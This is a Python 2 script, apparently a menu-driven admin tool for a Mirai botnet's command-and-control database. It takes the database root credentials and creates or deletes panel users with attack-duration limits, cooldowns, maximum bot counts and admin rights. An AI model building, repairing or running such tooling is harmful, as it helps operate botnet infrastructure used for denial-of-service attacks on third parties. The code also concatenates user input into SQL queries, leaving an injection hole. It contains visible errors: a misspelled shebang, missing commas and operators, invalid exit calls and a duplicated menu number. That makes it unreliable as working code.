#!/usr/bin/pyhon

#! Imports !#
import os
import sys
import time

#! Color Codes !#
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
C  = '\033[1;36m' # cyan

if os.name == 'posix':
    cmd = 'clear'
elif os.name == 'nt':
    cmd = 'cls'

try:
    import MySQLdb
except ImportError:
    os.system(cmd)
    print(R+"Please Install MySQLdb for Python!")
    print(R+"sudo apt-get install python-mysqldb -y ")
    print(R+"sudo yum install mysql-python -y ")
    sys.exit(+W" ")

mirai_Root_User = raw_input(C+"Mirai Root User: "+W)
mirai_Root_Pass = raw_input(C+"Mirai Root Pass: "+W)
mirai_data_Name = raw_input(C+"Mirai DB Name: "+W)

def _Execute_New():
    db = MySQLdb.connect(host="localhost",
                         user=mirai_Root_User,
                         passwd=mirai_Root_Pass
                         db=mirai_data_Name)

    _New_User = raw_input(C+"Username: ")
    _New_Pass = raw_input(C+"Password: ")
    _New_Duration = raw_input(C+"Duration Limit: ")
    _New_Cooldown = raw_input(C+"Cooldown: ")
    _New_Max_Bots = raw_input(C+"Max Bots -1 For All: ")
    _New_Admin = raw_input(C+"Admin 0-1: ")


    cur = db.cursor()
    cur.execute("INSERT INTO users VALUES (NULL, '"+_New_User+"', '"+_New_Pass"', "+_New_Duration+", "+_New_Cooldown+", 0, 0, "+_New_Max_Bots+", "+_New_Admin+", 30, '');")

    for row in cur.fetchall():
        print row[0], " ", row[1]
        time.sleep(4)
        sys.exit(+W" ")


def _Execute_Delete():
    db = MySQLdb.connect(host="localhost",
                         user=mirai_Root_User,
                         passwd=mirai_Root_Pass
                         db=mirai_data_Name)

    cur = db.cursor()
    cur.execute("SELECT * FROM users;")

    _Del_User = raw_input(C+"Select Users 'ID' You wish to delete")

    cur.execute("DELETE FROM users WHERE id='"+_Del_User+"';")
    for row in cur.fetchall():
        print row[0], " ", row[1]
        time.sleep(4)
        sys.exit(+W" ")


def _Execute_Update_User():
    print(R+"Not Implemented Yet")


def _Execute_Update_Password():
    print(R+"Not Implemented Yet")  

def _Menu():
    os.system(cmd)
    print(R+"-" * 45)
    print(R+"-" +W+ "[" +R+ "1" +W+ "] Create New Mirai User")
    print(R+"-" +W+ "[" +R+ "2" +W+ "] Delete Mirai User")
    print(R+"-" +W+ "[" +R+ "3" +W+ "] Update Users Name")
    print(R+"-" +W+ "[" +R+ "3" +W+ "] Update Users Password")
    _Menu_Choice = raw_input(C+"1-2: ")

    if _Menu_Choice == '1':
        _Execute_New()

    elif _Menu_Choice == '2':
        _Execute_Delete()

    elif _Menu_Choice == '3':
        _Execute_Update_User()

    elif _Menu_Choice == '4':
        _Execute_Update_Password()

    else:
        print(R+"Option " +_Menu_Choice+" Is not valid")

_Menu()
